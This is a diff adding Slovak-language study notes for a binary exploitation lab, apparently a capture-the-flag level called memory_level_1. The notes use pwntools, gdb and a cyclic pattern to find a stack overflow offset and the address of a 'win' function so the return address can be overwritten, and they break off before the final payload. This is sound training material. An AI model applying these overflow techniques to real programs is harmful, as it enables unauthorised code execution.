@@ -1,0 +1,41 @@
+***************************** General stuff *********************************
+$ checksec /memory_level_1
+	- check, ci su nejake fancy security vecicky zapnute
+	
+$ tmux 
+	- split screen https://tmuxcheatsheet.com/
+
+$ ipython
+	- rovno sa mozu hadzat python commandy
+	
+	
+********************************* Level 1 ************************************
+
+Zapnut tmux a ipython
+
+# 1. zistit offset
+
+ ipython:
+	
+	import pwn
+	p = pwn.gdb.debug("/memory_level_1") # spusti sa proces v debuggeri
+	p.clean() # vypis na obrazovku
+	p.sendline("200") # string + enter
+	p.clean() # vypis na obrazovku
+	p.send(pwn.cyclic(200, n=8)) # cyklicky pattern
+	
+	# v gdb by sa mali zacat diat veci
+	# zaujima nas co je na vrchu zasobnika, do gdb pacnut: x/gx $rsp
+	# dostaneme adresu 0x616161616161616a, skopcime
+	
+	pwn.cyclic_find(0x616161616161616a, n=8) 
+
+	# dostaneme cislo, co je offset = 72
+	
+	# v ninja najdeme adresu win = 0x401216
+	
+	
+# 2. prepisat adresu na win
+
+ ipython (pustit odznova): 
+	import pwn
